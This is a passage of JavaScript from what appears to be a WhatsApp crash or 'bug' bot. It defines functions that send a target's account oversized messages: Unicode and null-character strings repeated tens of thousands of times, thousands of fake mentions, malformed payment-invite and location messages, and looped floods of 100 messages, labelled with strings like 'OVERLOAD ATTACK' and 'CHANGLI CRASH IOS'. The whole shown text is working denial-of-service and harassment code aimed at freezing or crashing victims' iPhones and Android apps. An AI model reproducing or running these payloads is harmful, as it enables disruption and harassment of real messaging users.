                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: "",
                },
              },
            },
          },
        },
      },
    },
    ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}

//Audio Crl
async function AudioFlood(IsTarget) {
  const videoPayload = await prepareWAMessageMedia({
    video: { url: "https://files.catbox.moe/AbCdEsnith.mp4", gifPlayback: true }
  }, {
    upload: sock.waUploadToServer,
    mediaType: "video"
  })
  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(IsTarget, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: [IsTarget],
          isForwarded: true,
          forwardingScore: 999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363399013145023@newsletter",
            newsletterName: "newsletter crash ~",
            serverMessageId: 1
          }
        },
        header: {
          title: "...",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: { text: "...." },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"...".repeat(10)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio - buttons" + ".....".repeat(10),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { userJid: IsTarget })
    await Ataa.relayMessage(target, msg.message, { messageId: msg.key.id })
  }
}

//!Spack
async function sFuck(sheesh, objective) {
  try {
    const locationMessage = {
      degreesLatitude: -11.11,
      degreesLongitude: 12.12,
      jpegThumbnail: null,
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    };
     let b = [];

 b.push({
  name: "single_select",
  buttonParamsJson: JSON.stringify({ status: true }),
 });

 for (let i = 0; i < 100; i++) {
  b.push({
   name: "address_message",
   buttonParamsJson: JSON.stringify({ status: true }),
  });
 }
    let p = true;
    let t = "image/webp";
    if (11 > 9) p = false;
    let m = [];
    m.push(
      ...Array.from({ length: 1900 }, () =>
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    );

    const stickerMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
      fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=", 
      fileEncSha256:"zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
      mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
       mimetype: t,
 directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
      fileLength: { 
      low: Math.floor(Math.random() * 1000), 
      high: 2560, 
      unsigned: true 
      },
      mediaKeyTimestamp: "1751081957",
      firstFrameLength: 19904,
      firstFrameSidecar: "KN4kQ5pyABRAgA==",
      isAnimated: true,
      contextInfo: {
        participant: objective,
        mentionedJid: m,
        groupMentions: [],
        entryPointConversionSource: "non_contact",
        entryPointConversionApp: "whatsapp",
        entryPointConversionDelaySeconds: 467593,
      },
      stickerSentTs: {
        low: Math.floor(Math.random() * 20000000),
        high: 555,
        unsigned: p,
      },
      isAvatar: p,
      isAiSticker: p,
      isLottie: p,
    };

    const msg = generateWAMessageFromContent(objective, {
      viewOnceMessage: {
        message: { stickerMessage }
      }
    }, {});
    const extendMsg = {
      extendedTextMessage: {
        text: "𑇂𑆵𑆴𑆿".repeat(5000),
        format: "DEFAULT",
        matchedText: "\u0000".repeat(5000),
        description: "𑇂𑆵𑆴𑆿".repeat(5000),
        title: "𑇂𑆵𑆴𑆿".repeat(5000),
        previewType: "NONE",
        jpegThumbnail: null,
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    };

   const msg2 = generateWAMessageFromContent(objective, {
 viewOnceMessage: {
  message: {
   extendedTextMessage: {
    ...extendMsg.extendedTextMessage,
    contextInfo: {
     forwardedMessage: { locationMessage },
     unsupportedMessage: {
      interactiveMessage: {
       nativeFlowMessage: {
        buttons: b,
        messageParamsJson: JSON.stringify({
         placeholder: "",
         config: "",
        }),
       }
      }
     }
    }
   }
  }
 }
}, {});

    for (let ms of [msg, msg2]) {
      await Ataa.relayMessage('status@broadcast', ms.message, {
        messageId: ms.key.id,
        statusJidList: [objective],
        additionalNodes: [{
          tag: 'meta',
          attrs: {},
          content: [{
            tag: 'mentioned_users',
            attrs: {},
            content: [{
              tag: 'to',
              attrs: { jid: objective },
              content: undefined
            }]
          }]
        }]
      });
    }

    console.log(chalk.red(`Successyle to ${objective}`));

  } catch (err) {
    console.error(err);
  }
}
// -------------------( IOS FUNC )------------------- \\
async function SuperIosCore(target) {
      try {
        await Ataa.relayMessage(
          target,
          {
            extendedTextMessage: {
              text: "OVERLOAD ATTACK̊‏‎‏‎‏‎‏⭑",
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [
                      {
                        jid: target,
                        callOutcome: "1",
                      },
                    ],
                  },
                },
                remoteJid: target,
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: "This is an ad caption",
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "OVERLOAD",
                  body: "OVERLOAD ATTACK̊⭑",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewTtpe: "VIDEO",
                  thumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: "https://wa.me/settings",
                  mediaUrl: "https://wa.me/settings",
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: "https://wa.me/settings",
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbvampCampaignId: "smb_vamp_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            participant: { jid: target },
            userJid: target,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
 async function IosChatCore(target, Ptcp = true) {
      await Ataa.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Halo Im The Overload" + "\u0000".repeat(92000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 999999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Overload Call You" + "\u0003".repeat(55555),
                body: "Angkat Dong" + "𑜦࣯".repeat(2000),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/NEWCHANGLI",
                mediaUrl: "https://t.me/NEWCHANGLI",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/NEWCHANGLI",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbvampCampaignId: "smb_vamp_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    async function XiosVirusCore(target) {
      Ataa.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `Overload ios` + "࣯\u0003".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "iOS Lu Kenapa" + "\u0003".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
            quoted: ChangliKing
          },
        },
        {
          messageId: null,
        }
      );
    }
async function BlankIphoneCore(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "CHANGLI NO COUNTERS" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await Ataa.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}

async function InvisIphoneCore(target) {
Ataa.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "CHANGLI CRASH IOS" + "ꦾ࣯࣯".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}

async function CrashiPhoneCore(target) {
Ataa.relayMessage(
target,
{
  extendedTextMessage: {
    text: `iOS Crash` + "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "OverloadBugs ‌" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function UpiCrashCore(target) {
      await Ataa.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrashCore(target) {
      await Ataa.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function CrashIosCore(target) {
      await Ataa.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrashCore(target) {
      await Ataa.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function SqCrashCore(target) {
      await Ataa.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphoneCore(target) {
      await Ataa.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function iPhoneCore(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await Ataa.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/NEWCHANGLI",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
    async function ChangliIosCore(target) {
      await Ataa.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriepCore(target) {
      await Ataa.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function ChangliInvisIOSCore(target) {
      Ataa.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "OVERLOAD IOS INVISIBLE" + "ꦻ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //

    async function IPhoneAttackCore(target, Ptcp = true) {
      await Ataa.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "OVERLOAD IOS BLANK" + "ꦫꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAA